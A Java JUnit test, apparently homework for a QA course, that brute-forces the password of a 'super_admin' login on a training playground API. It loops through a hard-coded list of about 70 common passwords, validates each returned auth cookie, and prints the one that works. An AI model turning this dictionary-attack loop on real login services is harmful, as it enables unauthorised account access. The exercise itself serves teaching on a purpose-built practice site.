import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.util.HashMap;
import java.util.Map;



public class HelloWorldTest {
    static String uri = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
    static String uriCheck = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";
    static String login = "super_admin";
    static String[] password_arr = {"password","123456","123456789","12345678","12345","qwerty","abc123","football","1234567","monkey","111111","letmein","1234",
            "1234567890","dragon","baseball","sunshine","iloveyou","trustno1","princess","adobe123144","123123","welcome","login","admin","qwerty123","solo",
            "1q2w3e4r","master","666666","photoshop4","1qaz2wsx","qwertyuiop","ashley","mustang","121212","starwars","654321","bailey","access","flower",
            "555555","shadow","passw0rd","lovely","7777","michael","!@#$%^&*","jesus","password1","superman","hello","charlie","888888","696969","hottie",
            "freedom","aa123456","qazWSx","ninja","azerty","loveme","whatever","donald","batman","zaq1zaq1","qaZWSX","Football","000000","123qwe"};
    String password;
    @Test
    public void testRestAssured() {
        for (int i = 0; i<password_arr.length; i++) {
            Map<String, String> data = new HashMap<>();
            data.put("login", login);
            password = password_arr[i];
            data.put("password", password);
            Response response = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post(uri)
                    .andReturn();

            String responseCookies = response.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            if (responseCookies != null){
                cookies.put("auth_cookie", responseCookies);
            }

            Response responseForCheck = RestAssured
                    .given()
                    .body(data)
                    .cookies(cookies)
                    .when()
                    .post(uriCheck)
                    .andReturn();

            if (!responseForCheck.asString().equals("You are NOT authorized"))
            {
                responseForCheck.print();
                System.out.println("Password is: "+password);
                break;
            }
        }
    }
}
